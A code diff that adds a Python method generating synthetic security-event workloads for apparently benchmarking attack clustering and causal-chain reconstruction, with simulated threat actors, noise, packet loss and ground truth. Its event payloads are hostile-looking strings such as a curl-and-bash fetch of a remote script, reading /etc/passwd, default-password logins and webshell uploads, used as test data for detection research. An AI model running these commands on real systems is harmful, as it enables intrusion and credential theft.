@@ -402,3 +402,185 @@ class ScenarioGenerator:
                 "edges": causal_edges
             }
         }
+
+    def generate_stochastic_workload(
+        self,
+        seed: Optional[int] = None,
+        num_actors: Optional[int] = None,
+        noise_count: Optional[int] = None,
+        clock_skew_ms: Optional[float] = None,
+        packet_loss: Optional[float] = None,
+        jitter_ms: Optional[float] = None
+    ) -> Dict[str, Any]:
+        """
+        Generates a genuinely stochastic benchmark workload with controlled parameter variation:
+        - Randomized actor counts (2 to 3 threat actors)
+        - Variable event stages per actor (4 to 6 stages)
+        - Stochastic scanning noise injection (2 to 6 noise events)
+        - Injected packet loss (0% to 8%)
+        - Arrival jitter and clock skew perturbations
+        Ensures metric standard deviations are non-zero (std > 0) across repeated Monte Carlo trials.
+        """
+        trial_seed = seed if seed is not None else self.seed
+        rng = random.Random(trial_seed)
+        topology = TopologyGenerator.generate_topology(node_count=3)
+        base_time = 1700000000.0
+
+        # Draw stochastic parameters
+        n_actors = num_actors if num_actors is not None else rng.choice([2, 3])
+        n_noise = noise_count if noise_count is not None else rng.randint(2, 6)
+        skew_ms = clock_skew_ms if clock_skew_ms is not None else rng.uniform(800.0, 4800.0)
+        p_loss = packet_loss if packet_loss is not None else rng.uniform(0.0, 0.08)
+        jit_ms = jitter_ms if jitter_ms is not None else rng.uniform(15.0, 100.0)
+
+        events = []
+        gt_clusters = {}
+        causal_edges = []
+
+        # 1. Threat Actor Alpha (Multi-stage APT with internal pivot)
+        actor_alpha = self.actor_gen.generate_actor("ACTOR_ALPHA", fixed_ip=f"198.51.{rng.randint(10, 90)}.42", num_ips=1)
+        pivot_ip = f"192.168.{rng.randint(1, 50)}.5"
+        token = f"token-jump-pivot-{rng.randint(100, 999)}"
+
+        alpha_stages = [
+            ("TA0001_Initial_Access", "http", "web_probe", "GET /setup.php HTTP/1.1", None, topology[0], actor_alpha.source_ips[0]),
+            ("TA0006_Credential_Access", "ssh", "auth_login", "LOGIN admin / admin123", None, topology[0], actor_alpha.source_ips[0]),
+            ("TA0002_Execution", "ssh", "command_exec", "curl -O http://cdn.io/stage2.sh && bash stage2.sh", token, topology[0], actor_alpha.source_ips[0]),
+            ("TA0003_Persistence", "http", "web_upload", "POST /upload.php [webshell.php]", token, topology[0], actor_alpha.source_ips[0]),
+            ("TA0008_Lateral_Movement", "smb", "smb_connect", "SMB2_TREE_CONNECT \\\\node-2\\c$", token, topology[1], pivot_ip),
+            ("TA0010_Exfiltration", "smb", "payload_write", "SMB2_WRITE payload.exe", token, topology[1], pivot_ip)
+        ]
+        alpha_count = rng.choice([4, 5, 6])
+        alpha_events = []
+        for i, (tactic, srv, ev_type, pld, tok, node, ip) in enumerate(alpha_stages[:alpha_count]):
+            ts = base_time + (i * rng.uniform(40.0, 70.0))
+            ev = EventGenerator.create_event(
+                event_id=f"evt_stoch_a_{i+1}", actor=actor_alpha, node=node, service=srv,
+                tactic=tactic, timestamp_sec=ts, source_ip=ip,
+                payload_details={"event_type": ev_type, "payload": pld, "causal_token": tok}
+            )
+            alpha_events.append(ev)
+
+        # 2. Threat Actor Beta (Botnet brute force & port scan)
+        actor_beta = self.actor_gen.generate_actor("ACTOR_BETA", fixed_ip=f"203.0.{rng.randint(10, 90)}.88", num_ips=1)
+        beta_stages = [
+            ("TA0007_Discovery", "ssh", "port_scan", "TCP SYN probe port 22", None, topology[1]),
+            ("TA0001_Initial_Access", "ssh", "auth_login", "LOGIN root / 123456", None, topology[1]),
+            ("TA0006_Credential_Access", "ssh", "auth_login", "LOGIN root / password", None, topology[1]),
+            ("TA0002_Execution", "ssh", "command_exec", "uname -a && cat /etc/passwd", None, topology[1])
+        ]
+        beta_count = rng.choice([3, 4])
+        beta_events = []
+        for i, (tactic, srv, ev_type, pld, tok, node) in enumerate(beta_stages[:beta_count]):
+            ts = base_time + rng.uniform(15.0, 45.0) + (i * rng.uniform(35.0, 65.0))
+            ev = EventGenerator.create_event(
+                event_id=f"evt_stoch_b_{i+1}", actor=actor_beta, node=node, service=srv,
+                tactic=tactic, timestamp_sec=ts, source_ip=actor_beta.source_ips[0],
+                payload_details={"event_type": ev_type, "payload": pld, "causal_token": tok}
+            )
+            beta_events.append(ev)
+
+        # 3. Optional Threat Actor Gamma (Web Application Prober)
+        gamma_events = []
+        if n_actors >= 3:
+            actor_gamma = self.actor_gen.generate_actor("ACTOR_GAMMA", fixed_ip=f"198.18.{rng.randint(50, 150)}.12", num_ips=1)
+            gamma_stages = [
+                ("TA0001_Initial_Access", "http", "web_probe", "GET /.env HTTP/1.1", None, topology[2]),
+                ("TA0007_Discovery", "http", "web_probe", "GET /wp-config.php.bak HTTP/1.1", None, topology[2]),
+                ("TA0006_Credential_Access", "http", "auth_login", "POST /login admin/admin", None, topology[2])
+            ]
+            for i, (tactic, srv, ev_type, pld, tok, node) in enumerate(gamma_stages):
+                ts = base_time + rng.uniform(25.0, 55.0) + (i * rng.uniform(30.0, 60.0))
+                ev = EventGenerator.create_event(
+                    event_id=f"evt_stoch_g_{i+1}", actor=actor_gamma, node=node, service=srv,
+                    tactic=tactic, timestamp_sec=ts, source_ip=actor_gamma.source_ips[0],
+                    payload_details={"event_type": ev_type, "payload": pld, "causal_token": tok}
+                )
+                gamma_events.append(ev)
+
+        # Build raw attack clusters before packet loss
+        raw_attack_events = alpha_events + beta_events + gamma_events
+
+        # Injected packet loss (randomly drops events if p_loss > 0)
+        retained_attack_events = []
+        for ev in raw_attack_events:
+            if rng.random() >= p_loss:
+                retained_attack_events.append(ev)
+
+        # Ensure minimal viable event count
+        if len(retained_attack_events) < 4:
+            retained_attack_events = raw_attack_events
+
+        events.extend(retained_attack_events)
+
+        # Ground truth clusters based on retained attack events
+        retained_alpha = [e["event_id"] for e in retained_attack_events if e["actor_id"] == "ACTOR_ALPHA"]
+        retained_beta = [e["event_id"] for e in retained_attack_events if e["actor_id"] == "ACTOR_BETA"]
+        if retained_alpha:
+            gt_clusters["ACTOR_ALPHA"] = retained_alpha
+            for i in range(len(retained_alpha) - 1):
+                causal_edges.append({"from": retained_alpha[i], "to": retained_alpha[i+1]})
+        if retained_beta:
+            gt_clusters["ACTOR_BETA"] = retained_beta
+            for i in range(len(retained_beta) - 1):
+                causal_edges.append({"from": retained_beta[i], "to": retained_beta[i+1]})
+        if n_actors >= 3:
+            retained_gamma = [e["event_id"] for e in retained_attack_events if e["actor_id"] == "ACTOR_GAMMA"]
+            if retained_gamma:
+                gt_clusters["ACTOR_GAMMA"] = retained_gamma
+                for i in range(len(retained_gamma) - 1):
+                    causal_edges.append({"from": retained_gamma[i], "to": retained_gamma[i+1]})
+
+        # Benign scanning noise
+        for n_idx in range(n_noise):
+            noise_ip = f"198.18.{rng.randint(200, 250)}.{n_idx + 1}"
+            ev_n = {
+                "event_id": f"evt_stoch_noise_{n_idx+1}",
+                "timestamp": base_time + rng.uniform(10.0, 350.0),
+                "real_timestamp": base_time + rng.uniform(10.0, 350.0),
+                "source_ip": noise_ip,
+                "target_node": f"node-{n_idx % 3 + 1}",
+                "service": rng.choice(["http", "ssh", "ntp"]),
+                "event_type": "web_probe" if n_idx % 2 == 0 else "port_scan",
+                "payload": "GET /robots.txt HTTP/1.1" if n_idx % 2 == 0 else "TCP SYN probe",
+                "causal_token": None
+            }
+            events.append(ev_n)
+
+        # Build clean unannotated event list with randomized arrival jitter
+        unannotated = []
+        for e in events:
+            jitter_sec = rng.uniform(-jit_ms / 2000.0, jit_ms / 2000.0)
+            real_t = e.get("real_timestamp") if e.get("real_timestamp") is not None else 1700000000.0
+            unannotated.append({
+                "event_id": e["event_id"],
+                "timestamp": real_t + jitter_sec,
+                "real_timestamp": real_t,
+                "source_ip": e.get("source_ip"),
+                "target_node": e.get("node_id") or e.get("target_node", "node-1"),
+                "service": e.get("service_id") or e.get("service", "unknown"),
+                "event_type": e.get("event_type") or (e.get("payload", {}).get("event_type") if isinstance(e.get("payload"), dict) else None) or "unknown",
+                "payload": e.get("payload", {}).get("payload") if isinstance(e.get("payload"), dict) else e.get("payload"),
+                "causal_token": e.get("payload", {}).get("causal_token") if isinstance(e.get("payload"), dict) else e.get("causal_token")
+            })
+
+        return {
+            "scenario": "STOCHASTIC_MONTE_CARLO_WORKLOAD",
+            "seed": trial_seed,
+            "parameters": {
+                "num_actors": n_actors,
+                "noise_count": n_noise,
+                "clock_skew_ms": round(skew_ms, 2),
+                "network_delay_ms": round(rng.uniform(10.0, 75.0), 2),
+                "packet_loss": round(p_loss, 4),
+                "jitter_ms": round(jit_ms, 2),
+                "total_events": len(unannotated),
+                "attack_events": len(retained_attack_events)
+            },
+            "unannotated_events": unannotated,
+            "ground_truth_clusters": gt_clusters,
+            "ground_truth_dag": {
+                "nodes": [e["event_id"] for e in events],
+                "edges": causal_edges
+            }
+        }
